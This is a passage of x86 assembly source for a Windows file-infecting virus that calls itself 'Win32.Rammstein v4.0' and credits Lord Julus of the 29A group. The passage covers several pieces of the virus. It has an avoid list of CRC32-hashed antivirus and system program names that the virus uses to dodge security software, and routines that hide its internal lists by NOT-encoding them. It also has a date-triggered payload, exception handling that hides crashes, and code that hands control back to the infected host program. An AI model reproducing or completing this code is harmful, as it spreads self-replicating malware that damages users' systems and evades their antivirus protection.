r                RECT <?>                          ;
lppaint          PAINTSTRUCT <?>                   ;
textmetric       TEXTMETRIC <?>                    ;
xmax             dd 0                              ;
ymax             dd 0                              ;
xlength          dd 0                              ;
ylength          dd 0                              ;
xpos             dd 0                              ;
ypos             dd 0                              ;
current          dd 0                              ;
hdc              dd 0                              ;
chars            dd "Z"-"A"+2 dup (0)              ;
szTitleName      db 'Win32.Rammstein', 0           ;
szClassName      db 'RAMMSTEIN', 0                 ;
                                                   ;
DefaultStyle  = WS_OVERLAPPED+WS_VISIBLE           ;
ExtendedStyle = WS_EX_TOPMOST                      ;
                                                   ;
;==================================================;=========================
                                                   ;
ValidateFile:                                      ;
; ESI = pointer to filename                        ;
ret
       pusha                                       ;
       lea eax, [ebp+VF_ExceptionExit]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
                                                   ;
       call [ebp+_lstrlen], esi                    ;get the filename length
       cmp eax, 256                                ;is it too big?
       ja invalid_file                             ;
       mov ecx, eax                                ;
                                                   ;
       push ecx                                    ;uppercase the name
       call [ebp+_CharUpperBuffA], esi, ecx        ;
       pop ecx                                     ;
                                                   ;
       @endsz                                      ;go to it's end
       inc ecx                                     ;
       std                                         ;
       mov edi, esi                                ;and look backwards for
       mov al,'\'                                  ;the '\'
       repnz scasb                                 ;
       mov esi, edi                                ;
       or ecx, ecx                                 ;
       jz no_increase                              ;
       inc esi                                     ;if we found one, point it
       inc esi                                     ;
                                                   ;
no_increase:                                       ;
       cld                                         ;restore direction
       lea edi, [ebp+offset avoid_list]            ;our avoid list
                                                   ;
search_next:                                       ;
       cmp byte ptr [edi], 0FFh                    ;last entry?
       je all_names_ok                             ;
       xor ebx, ebx                                ;
       mov bl, [edi+4]                             ;get the name length
       xor ecx, ecx                                ;
       xchg byte ptr [esi+ebx], cl                 ;limit our string to the
       push esi                                    ;length with a 0
       call StringCRC32                            ;and compute a crc32 for
       pop esi                                     ;the piece...
       xchg byte ptr [esi+ebx], cl                 ;restore filename
       cmp eax, [edi]                              ;does it match?
       je av_name_found                            ;
       add edi, 5                                  ;get next...
       jmp search_next                             ;
                                                   ;
av_name_found:                                     ;
invalid_file:                                      ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       popa                                        ;
       stc                                         ;
       ret                                         ;
                                                   ;
all_names_ok:                                      ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       popa                                        ;
       clc                                         ;
       ret                                         ;
                                                   ;
 VF_ExceptionExit:                                 ;if we had an error we
        mov esp, [esp+8]                           ;must restore the ESP
        call DeltaRecoverVF                        ;
 DeltaRecoverVF:                                   ;
        pop ebp                                    ;
        sub ebp, offset DeltaRecoverVF             ;
        jmp invalid_file                           ;
                                                   ;
avoid_list:                                        ;
       crc32 <AV>                                 ;
       db 3                                        ;
       crc32 <_AV>                                 ;the list with filenames
       db 3                                        ;to avoid
       crc32 <ALERT>                               ;
       db 5                                        ;
       crc32 <AMON>                                ;
       db 4                                        ;
       crc32 <N32>                                 ;
       db 3                                        ;
       crc32 <NOD>                                 ;
       db 3                                        ;
       crc32 <NPSSVC>                              ;
       db 6                                        ;
       crc32 <NSCHEDNT>                            ;
       db 8                                        ;
       crc32 <NSPLUGIN>                            ;
       db 8                                        ;
       crc32 <TB>                                  ;
       db 2                                        ;
       crc32 <F->                                  ;
       db 2                                        ;
       crc32 <AW>                                  ;
       db 2                                        ;
       crc32 <AV>                                  ;
       db 2                                        ;
       crc32 <NAV>                                 ;
       db 3                                        ;
       crc32 <PAV>                                 ;
       db 3                                        ;
       crc32 <RAV>                                 ;
       db 3                                        ;
       crc32 <NVC>                                 ;
       db 3                                        ;
       crc32 <FPR>                                 ;
       db 3                                        ;
       crc32 <DSS>                                 ;
       db 3                                        ;
       crc32 <IBM>                                 ;
       db 3                                        ;
       crc32 <INOC>                                ;
       db 3                                        ;
       crc32 <ANTI>                                ;
       db 3                                        ;
       crc32 <SCN>                                 ;
       db 3                                        ;
       crc32 <SCAN>                                ;
       db 4                                        ;
       crc32 <VSAF>                                ;
       db 3                                        ;
       crc32 <VSWP>                                ;
       db 3                                        ;
       crc32 <PANDA>                               ;
       db 3                                        ;
       crc32 <DRWEB>                               ;
       db 3                                        ;
       crc32 <FSAV>                                ;
       db 3                                        ;
       crc32 <SPIDER>                              ;
       db 3                                        ;
       crc32 <ADINF>                               ;
       db 3                                        ;
       crc32 <EXPLORER>                            ;
       db 8                                        ;
       crc32 <SONIQUE>                             ;
       db 7                                        ;
       crc32 <SQSTART>                             ;
       db 7                                        ;
       crc32 <SMSS>                                ;
       db 4                                        ;
       crc32 <OUTLOOK>                             ;
       db 7                                        ;
       crc32 <PSTORES>                             ;
       db 7                                        ;
       db 0FFh                                     ;
                                                   ;
                                                   ;
not_list proc                                      ;
____1: cmp [ebp+copying], 1                        ;syncronization
       je ____1                                    ;
       mov [ebp+in_list], 1                        ;
       push esi edi                                ;this NOTs a list
       mov edi, esi                                ;
not_byte:                                          ;
       lodsb                                       ;
       not al                                      ;
       stosb                                       ;
       loop not_byte                               ;
       pop edi esi                                 ;
       mov [ebp+in_list], 0                        ;
       ret                                         ;
not_list endp                                      ;
in_list db 0                                       ;
                                                   ;
brandom32 proc                                     ;this bounds eax
       push edx                                    ;between 0 and eax-1
       push ecx                                    ;on random basis
       mov edx, 0                                  ;
       push eax                                    ;
       call random32                               ;
       pop ecx                                     ;
       div ecx                                     ;
       xchg eax, edx                               ;
       pop ecx                                     ;
       pop edx                                     ;
       ret                                         ;
brandom32 endp                                     ;
                                                   ;
random32 proc                                      ;this is a random nr
       push edx                                    ;generator. It's a
       call [ebp+_GetTickCount]                    ;modified version of
       rcl eax, 2                                  ;some random gen I found
       add eax, 12345678h                          ;someday and it had
random_seed = dword ptr $-4                        ;some flaws I fixed...
       adc eax, esp                                ;
       xor eax, ecx                                ;
       xor [ebp+random_seed], eax                  ;
       add eax, [esp-8]                            ;
       rcl eax, 1                                  ;
       pop edx                                     ;
       ret                                         ;
random32 endp                                      ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
check_not proc                                     ;
       pusha                                       ;Be sure not to let
       lea esi, [ebp+list_of_lists]                ;some of the lists
                                                   ;un-NOTed in the
get_another:                                       ;victim file
       lodsd                                       ;
       or eax, eax                                 ;
       jz correct                                  ;
       add eax, [ebp+finaldestination]             ;
       cmp byte ptr [eax], NOT "L"                 ;
       je no_problem                               ;
       call wrong                                  ;
                                                   ;
no_problem:                                        ;
       add esi, 4                                  ;
       jmp get_another                             ;
                                                   ;
correct:                                           ;
       popa                                        ;
       ret                                         ;
                                                   ;
wrong:                                             ;
       pusha                                       ;
       push eax                                    ;
       lodsd                                       ;
       pop esi                                     ;
       mov ecx, eax                                ;
       call not_list                               ;
       popa                                        ;
       ret                                         ;
check_not endp                                     ;
                                                   ;
list_of_lists label                                ;
              dd offset direct_list - offset start, direct_list_len
              dd offset file_extensions - offset start, file_extensions_len
              dd offset av_list - offset start, av_list_len
              dd 0                                 ;
                                                   ;
KillThread:                                        ;
       IF VIRUSNOTIFYEXIT                          ;
       push 0                                      ;
       call exittext1                              ;
       db 'Rammstein viral code end!', 0           ;
exittext1:                                         ;
       call exittext2                              ;
       db 'Rammstein viral code end!', 0           ;
exittext2:                                         ;
       push 0                                      ;
       call [ebp+_MessageBoxA]                     ;
       ENDIF                                       ;

       IF PAYLOAD                                  ;
       lea eax, [ebp+time]                         ;
       call [ebp+_GetSystemTime], eax              ;
       lea edi, [ebp+time]                         ;
       cmp word ptr [edi.ST_wDay], 14d             ;
       jne no_payload                              ;
       call DoPayload                              ;
                                                   ;
no_payload:                                        ;
       ENDIF                                       ;
                                                   ;
       IF MAINTHREADSEH                            ;
       jmp restore_main_seh                        ;host
                                                   ;
MainExceptionExit:                                 ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
                                                   ;
restore_main_seh:                                  ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;returning to the host...
                                                   ;
       call restore_delta                          ;
restore_delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset restore_delta               ;
                                                   ;
just_kill_it:                                      ;
       ENDIF
       mov eax, [ebp+_ExitThread]                  ;Exit the main thread
       push 0                                      ;
       call eax                                    ;

;
; Safe Copro. Thanx to Prizzy for pointing me that the copro cannot be shared
; in the same process and need to be saved to keep compatibility!

InitCopro:                                         ;
       sub esp, 128                                ;create space for copro
       fwait                                       ;data, wait for last to
       fnsave [esp]                                ;finish and save...
       finit                                       ;initialize copro
       jmp dword ptr [esp+80h]                     ;and return
                                                   ;
RestoreCopro:                                      ;
       fwait                                       ;wait to finish
       frstor [esp+4]                              ;restore copro data
       xchg eax, dword ptr [esp]                   ;now find out our return
       xchg eax, dword ptr [esp+80h]               ;address without altering
       xchg eax, dword ptr [esp]                   ;eax, kill the copro space
       add esp, 128                                ;on the stack. One Dword
       ret                                         ;remains on the stack
                                                   ;
EPO_Routine:                                       ;
       clc                                         ;
       ret                                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
; Data area                                        ;
test_semaphore dd 0                                ;
W32FD          WIN32_FIND_DATA <?>                 ;
time           SYSTEMTIME <0>                      ;
memory         dd 0                                ;
free_routine   dd AVAILABLE                        ;
version        db 0                                ;
newsize        dd 0                                ;
newraw         dd 0                                ;
situation      dd 0                                ;
DeltaRVA       dd 0                                ;
mainthreadid   dd 0                                ;
headersum      dd 0                                ;
checksumfile   dd 0                                ;
lowest_section_raw dd 0                            ;
apihookfinish  dd 0                                ;
tempcounter    dd 0                                ;
fileopen       dd 0                                ;
Semaphore      db "Win32.Rammstein", 0             ;
saved_code     dd 0, 0                             ;
mmx            dd 0                                ;
skipper        db 0                                ;
no_imports     db 0                                ;
totalsizes     dd 0                                ;
smallest_dir_va dd 0                               ;
netapis        dd 0                                ;
ok             dd 0
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
include get_apis.inc                               ;included files
include rammdata.inc                               ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
virussize = end-start                              ;
copyright db 'Win32.Rammstein.'                    ;
          db virussize/10000 mod 10 + '0'          ;
          db virussize/01000 mod 10 + '0'          ;
          db virussize/00100 mod 10 + '0'          ;
          db virussize/00010 mod 10 + '0'          ;
          db virussize/00001 mod 10 + '0'          ;
          db ' v4.0', 10,13                        ;
          db '(c) Lord Julus - 2000 / [29A]',10,13 ;
MainThread endp                                    ;
end2:                                              ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
IF DEBUG                                           ;
   debug_end db 'Here is the end of the virus.',0  ;
ENDIF                                              ;
end label                                          ;
end start                                          ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

